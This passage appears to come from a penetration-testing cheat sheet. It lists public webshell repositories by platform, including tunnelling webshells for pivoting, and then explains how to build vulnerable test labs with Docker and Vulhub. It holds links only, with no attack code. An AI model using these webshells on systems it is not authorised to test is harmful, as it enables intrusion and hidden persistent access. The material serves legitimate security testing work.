| All types | https://github.com/xl7dev/WebShell | 	
| All types | https://github.com/BlackArch/webshells/tree/master |
| All types | https://github.com/alphaSeclab/awesome-webshell/ |
| .NET (ASPX) | https://github.com/tennc/webshell/tree/master/aspx/asp.net-backdoors |
| .NET (ASPX) | https://github.com/antonioCoco/SharPyShell |
| .NET (ASP) | https://github.com/tennc/webshell/tree/master/fuzzdb-webshell/asp |
| JAVA | https://github.com/SecurityRiskAdvisors/cmd.jsp |
| JAVA | https://github.com/tennc/webshell/tree/master/fuzzdb-webshell/jsp |
| PHP | https://github.com/WhiteWinterWolf/wwwolf-php-webshell |
| PHP | https://github.com/tennc/webshell/tree/master/fuzzdb-webshell/php |
| PHP | https://github.com/bayufedra/Tiny-PHP-Webshell |
| PHP | https://github.com/epinna/weevely3 |
| PHP | https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/ https://www.acunetix.com/blog/articles/keeping-web-shells-undercover-an-introduction-to-web-shells-part-3/ |
| Nodejs | https://github.com/Zibri/wshell3 |
| Multiple types | https://github.com/EatonChips/wsh |
| Multiple types | https://github.com/hosch3n/msmap |
| Webshell for pivoting (TCP tunnelling over HTTP) | https://github.com/blackarrowsec/pivotnacci |
| Webshell for pivoting (TCP tunnelling over HTTP) | https://github.com/L-codes/Neo-reGeorg |
| Webshell for pivoting (TCP tunnelling over HTTP) | https://github.com/SecarmaLabs/chunkyTuna |

-----------------

### V. Quickly set up a test environment using Docker
#### Docker can be used to quickly set up a testing environment (https://hub.docker.com/search?q=)
```
For examples:
➤ docker pull tomcat
➤ docker pull phpmyadmin
➤ docker pull nginx
➤ docker pull ismaleiva90/weblogic12
➤ docker pull jboss/keycloak
➤ docker pull wordpress
➤ ..
```
#### Projects like 'Vulhub' can also be very useful (https://github.com/vulhub/vulhub) 
```
➤ Jboss Web server - https://github.com/vulhub/vulhub/tree/master/jboss
➤ Tomcat Web server - https://github.com/vulhub/vulhub/tree/master/tomcat
➤ Weblogic Web server - https://github.com/vulhub/vulhub/tree/master/weblogic
➤ Nginx Web server - https://github.com/vulhub/vulhub/tree/master/nginx
➤ PhpMyAdmin portal - https://github.com/vulhub/vulhub/tree/master/phpmyadmin
➤ Jenkins server - https://github.com/vulhub/vulhub/tree/master/jenkins
➤ ...
```
